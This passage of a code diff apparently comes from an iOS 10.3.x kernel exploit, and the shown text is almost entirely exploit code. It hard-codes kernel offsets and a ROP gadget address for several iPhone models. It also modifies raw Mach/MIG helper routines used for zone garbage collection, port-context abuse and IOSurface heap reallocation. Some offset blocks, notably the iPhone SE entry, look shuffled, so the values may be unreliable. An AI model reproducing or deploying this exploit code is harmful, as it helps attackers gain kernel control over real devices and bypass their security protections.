+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 5c (Global)
+    if(!strcmp(device, "iPhone5,4"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    
+    //iPhone 5s
+    if(!strcmp(device, "iPhone6,2") || !strcmp(device, "iPhone6,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff00754c478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a8050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a8048;
+            OFFSET_REALHOST                             = 0xfffffff00752eba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_COPYIN                               = 0xfffffff007180e98;
+            OFFSET_COPYOUT                              = 0xfffffff00718108c;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099f14;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad1ec;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff007099a38;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006f25538;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006522174;
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            printf("Offsets for 5s 10.3.2 set#####");
+            
+            OFFSET_ZONE_MAP                             = 0xfffffff00754c478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a8050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a8048;
+            OFFSET_REALHOST                             = 0xfffffff00752eba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071811ec;
+            OFFSET_COPYOUT                              = 0xfffffff0071813e0;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099f14;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad1ec;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff007099a38;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006f25538;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006526174;
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff00754c478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a8050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a8048;
+            OFFSET_REALHOST                             = 0xfffffff00752eba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_COPYIN                               = 0xfffffff007181218;
+            OFFSET_COPYOUT                              = 0xfffffff00718140c;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099f7c;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad1d4;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff007099aa0;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006f25538;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006525174;
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 6+
+    if(!strcmp(device, "iPhone7,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 6
+    if(!strcmp(device, "iPhone7,2"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007558478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075b4050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075b4048;
+            OFFSET_REALHOST                             = 0xfffffff00753aba0;
+            OFFSET_BZERO                                = 0xfffffff00708df80;
+            OFFSET_BCOPY                                = 0xfffffff00708ddc0;
+            OFFSET_COPYIN                               = 0xfffffff00718d028;
+            OFFSET_COPYOUT                              = 0xfffffff00718d21c;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070a60b4;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070b938c;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070a5bd8;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006135000 + 0x1030;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b2174;
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007558478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075b4050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075b4048;
+            OFFSET_REALHOST                             = 0xfffffff00753aba0;
+            OFFSET_BZERO                                = 0xfffffff00708df80;
+            OFFSET_BCOPY                                = 0xfffffff00708ddc0;
+            OFFSET_COPYIN                               = 0xfffffff00718d37c;
+            OFFSET_COPYOUT                              = 0xfffffff00718d570;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070a60b4;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070b938c;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070a5bd8;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006eee1b8;
+            //OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b2174;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006642c90;
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007558478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075b4050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075b4048;
+            OFFSET_REALHOST                             = 0xfffffff00753aba0;
+            OFFSET_BZERO                                = 0xfffffff00708df80;
+            OFFSET_BCOPY                                = 0xfffffff00708ddc0;
+            OFFSET_COPYIN                               = 0xfffffff00718d3a8;
+            OFFSET_COPYOUT                              = 0xfffffff00718d59c;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070a611c;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070b9374;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070a5c40;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006eed2b8;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b5174;
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 6s
+    if(!strcmp(device, "iPhone8,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007548478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a4050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a4048;
+            OFFSET_REALHOST                             = 0xfffffff00752aba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071803a0;
+            OFFSET_COPYOUT                              = 0xfffffff007180594;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099e94;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad16c;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070999b8;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e7c9f8;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006462174;
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007548478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a4050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a4048;
+            OFFSET_REALHOST                             = 0xfffffff00752aba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071806f4;
+            OFFSET_COPYOUT                              = 0xfffffff0071808e8;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099e94;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad16c;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070999b8;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e7c9f8;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b1398;
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 6s+
+    if(!strcmp(device, "iPhone8,2"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone SE
+    if(!strcmp(device, "iPhone8,4"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007548478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff007081dc0;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0071806f4;
+            OFFSET_REALHOST                             = 0xfffffff00752aba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff0071808e8;
+            OFFSET_COPYIN                               = 0xfffffff0075a4050;
+            OFFSET_COPYOUT                              = 0xfffffff0075a4048;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099e94;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad16c;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070999b8;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e849f8;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006482174;
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 7
+    if(!strcmp(device, "iPhone9,3") || !strcmp(device, "iPhone9,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+            OFFSET_REALHOST                             = 0xfffffff007572ba0;
+            OFFSET_BZERO                                = 0xfffffff0070c1f80;
+            OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071c5db4;
+            OFFSET_COPYOUT                              = 0xfffffff0071c6094;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+            // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063c5398;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064fb0a8;
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+            OFFSET_REALHOST                             = 0xfffffff007572ba0;
+            OFFSET_BZERO                                = 0xfffffff0070c1f80;
+            OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071c6108;
+            OFFSET_COPYOUT                              = 0xfffffff0071c63e8;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0065000a8;
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+            OFFSET_REALHOST                             = 0xfffffff007572ba0;
+            OFFSET_BZERO                                = 0xfffffff0070c1f80;
+            OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071c6134;
+            OFFSET_COPYOUT                              = 0xfffffff0071c6414;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070df05c;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22b4;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb80;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064ff0a8;
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 7 Plus
+    if(!strcmp(device, "iPhone9,4") || !strcmp(device, "iPhone9,2"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+            OFFSET_REALHOST                             = 0xfffffff007572ba0;
+            OFFSET_BZERO                                = 0xfffffff0070c1f80;
+            OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071c5db4;
+            OFFSET_COPYOUT                              = 0xfffffff0071c6094;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+            // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063c5398;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064fb0a8;
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+            OFFSET_REALHOST                             = 0xfffffff007572ba0;
+            OFFSET_BZERO                                = 0xfffffff0070c1f80;
+            OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071c6108;
+            OFFSET_COPYOUT                              = 0xfffffff0071c63e8;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+            // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063ca398;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0065000a8;
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+            OFFSET_REALHOST                             = 0xfffffff007572ba0;
+            OFFSET_BZERO                                = 0xfffffff0070c1f80;
+            OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+            OFFSET_COPYIN                               = 0xfffffff0071c6134;
+            OFFSET_COPYOUT                              = 0xfffffff0071c6414;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070df05c;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22b4;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb80;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+            // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063c9398;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064ff0a8;
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPod touch 6
+    if(!strcmp(device, "iPod7,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    
+    LOG("%s", kern_version);
+    LOG("loading offsets for %s - %s", device, version);
+    LOG("test offset x0x0x10gadget: %llx", OFFSET_ROP_ADD_X0_X0_0x10);
+}
 
-#define UINT64_ALIGN(addr) (((addr) + 7) & ~7)
 
-#define UNALIGNED_COPY(src, dst, size) \
-do \
-{ \
-for(volatile uint32_t *_src = (volatile uint32_t*)(src), \
-*_dst = (volatile uint32_t*)(dst), \
-*_end = (volatile uint32_t*)((uintptr_t)(_src) + (size)); \
-_src < _end; \
-*(_dst++) = *(_src++) \
-); \
-} while(0)
-
-#   define UNALIGNED_KPTR_DEREF(addr) (((kptr_t)*(volatile uint32_t*)(addr)) | (((kptr_t)*((volatile uint32_t*)(addr) + 1)) << 32))
-
-#define VOLATILE_ZERO(addr, size) \
-do \
-{ \
-for(volatile uintptr_t *ptr = (volatile uintptr_t*)(addr), \
-*end = (volatile uintptr_t*)((uintptr_t)(ptr) + (size)); \
-ptr < end; \
-*(ptr++) = 0 \
-); \
-} while(0)
-
-#define RELEASE_PORT(port) \
-do \
-{ \
-if(MACH_PORT_VALID((port))) \
-{ \
-_kernelrpc_mach_port_destroy_trap(self, (port)); \
-port = MACH_PORT_NULL; \
-} \
-} while(0)
-
-// ********** ********** ********** IOKit ********** ********** **********
-
+// IOKit cruft
 typedef mach_port_t io_service_t;
 typedef mach_port_t io_connect_t;
 extern const mach_port_t kIOMasterPortDefault;
@@ -172,11 +1608,8 @@ kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selecto
 kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
 kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
 
-// ********** ********** ********** other unexported symbols ********** ********** **********
-
+// Other unexported symbols
 kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
-
-// ********** ********** ********** helpers ********** ********** **********
 
 static const char *errstr(int r)
 {
@@ -194,20 +1627,23 @@ static uint32_t transpose(uint32_t val)
     return ret + 0x01010101;
 }
 
-// ********** ********** ********** MIG ********** ********** **********
-
 static kern_return_t my_mach_zone_force_gc(host_t host)
 {
 #pragma pack(4)
     typedef struct {
         mach_msg_header_t Head;
-    } Request;
+    } Request __attribute__((unused));
     typedef struct {
         mach_msg_header_t Head;
         NDR_record_t NDR;
         kern_return_t RetCode;
         mach_msg_trailer_t trailer;
-    } Reply;
+    } Reply __attribute__((unused));
+    typedef struct {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        kern_return_t RetCode;
+    } __Reply __attribute__((unused));
 #pragma pack()
     
     union {
@@ -216,7 +1652,7 @@ static kern_return_t my_mach_zone_force_gc(host_t host)
     } Mess;
     
     Request *InP = &Mess.In;
-    Reply *OutP = &Mess.Out;
+    Reply *Out0P = &Mess.Out;
     
     InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
     InP->Head.msgh_remote_port = host;
@@ -227,7 +1663,7 @@ static kern_return_t my_mach_zone_force_gc(host_t host)
     kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if(ret == KERN_SUCCESS)
     {
-        ret = OutP->RetCode;
+        ret = Out0P->RetCode;
     }
     return ret;
 }
@@ -239,14 +1675,20 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
         mach_msg_header_t Head;
         NDR_record_t NDR;
         mach_port_name_t name;
-    } Request;
+    } Request __attribute__((unused));
     typedef struct {
         mach_msg_header_t Head;
         NDR_record_t NDR;
         kern_return_t RetCode;
         mach_vm_address_t context;
         mach_msg_trailer_t trailer;
-    } Reply;
+    } Reply __attribute__((unused));
+    typedef struct {
+        mach_msg_header_t Head;
+        NDR_record_t NDR;
+        kern_return_t RetCode;
+        mach_vm_address_t context;
+    } __Reply __attribute__((unused));
 #pragma pack()
     
     union {
@@ -255,7 +1697,7 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
     } Mess;
     
     Request *InP = &Mess.In;
-    Reply *OutP = &Mess.Out;
+    Reply *Out0P = &Mess.Out;
     
     InP->NDR = NDR_record;
     InP->name = name;
@@ -268,185 +1710,14 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
     kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if(ret == KERN_SUCCESS)
     {
-        ret = OutP->RetCode;
+        ret = Out0P->RetCode;
     }
     if(ret == KERN_SUCCESS)
     {
-        *context = OutP->context;
+        *context = Out0P->context;
     }
     return ret;
 }
-
-kern_return_t my_mach_port_set_context(task_t task, mach_port_name_t name, mach_vm_address_t context)
-{
-#pragma pack(4)
-    typedef struct {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        mach_port_name_t name;
-        mach_vm_address_t context;
-    } Request;
-    typedef struct {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        kern_return_t RetCode;
-        mach_msg_trailer_t trailer;
-    } Reply;
-#pragma pack()
-    
-    union {
-        Request In;
-        Reply Out;
-    } Mess;
-    
-    Request *InP = &Mess.In;
-    Reply *OutP = &Mess.Out;
-    
-    InP->NDR = NDR_record;
-    InP->name = name;
-    InP->context = context;
-    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
-    InP->Head.msgh_remote_port = task;
-    InP->Head.msgh_local_port = mig_get_reply_port();
-    InP->Head.msgh_id = 3229;
-    InP->Head.msgh_reserved = 0;
-    
-    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-    if(ret == KERN_SUCCESS)
-    {
-        ret = OutP->RetCode;
-    }
-    return ret;
-}
-
-// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
-// Prepare everything - sched_yield() - fire.
-static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len)
-{
-#pragma pack(4)
-    typedef struct {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        uint32_t selector;
-        mach_msg_type_number_t scalar_inputCnt;
-        mach_msg_type_number_t inband_inputCnt;
-        uint32_t inband_input[4];
-        mach_vm_address_t ool_input;
-        mach_vm_size_t ool_input_size;
-        mach_msg_type_number_t inband_outputCnt;
-        mach_msg_type_number_t scalar_outputCnt;
-        mach_vm_address_t ool_output;
-        mach_vm_size_t ool_output_size;
-    } DeleteRequest;
-    typedef struct {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        uint32_t selector;
-        mach_msg_type_number_t scalar_inputCnt;
-        mach_msg_type_number_t inband_inputCnt;
-        mach_vm_address_t ool_input;
-        mach_vm_size_t ool_input_size;
-        mach_msg_type_number_t inband_outputCnt;
-        mach_msg_type_number_t scalar_outputCnt;
-        mach_vm_address_t ool_output;
-        mach_vm_size_t ool_output_size;
-    } SetRequest;
-    typedef struct {
-        mach_msg_header_t Head;
-        NDR_record_t NDR;
-        kern_return_t RetCode;
-        mach_msg_type_number_t inband_outputCnt;
-        char inband_output[4096];
-        mach_msg_type_number_t scalar_outputCnt;
-        uint64_t scalar_output[16];
-        mach_vm_size_t ool_output_size;
-        mach_msg_trailer_t trailer;
-    } Reply;
-#pragma pack()
-    
-    // Delete
-    union {
-        DeleteRequest In;
-        Reply Out;
-    } DMess;
-    
-    DeleteRequest *DInP = &DMess.In;
-    Reply *DOutP = &DMess.Out;
-    
-    DInP->NDR = NDR_record;
-    DInP->selector = IOSURFACE_DELETE_VALUE;
-    DInP->scalar_inputCnt = 0;
-    
-    DInP->inband_input[0] = surfaceId;
-    DInP->inband_input[2] = transpose(propertyId);
-    DInP->inband_input[3] = 0x0; // Null terminator
-    DInP->inband_inputCnt = sizeof(DInP->inband_input);
-    
-    DInP->ool_input = 0;
-    DInP->ool_input_size = 0;
-    
-    DInP->inband_outputCnt = sizeof(uint32_t);
-    DInP->scalar_outputCnt = 0;
-    DInP->ool_output = 0;
-    DInP->ool_output_size = 0;
-    
-    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
-    DInP->Head.msgh_remote_port = client;
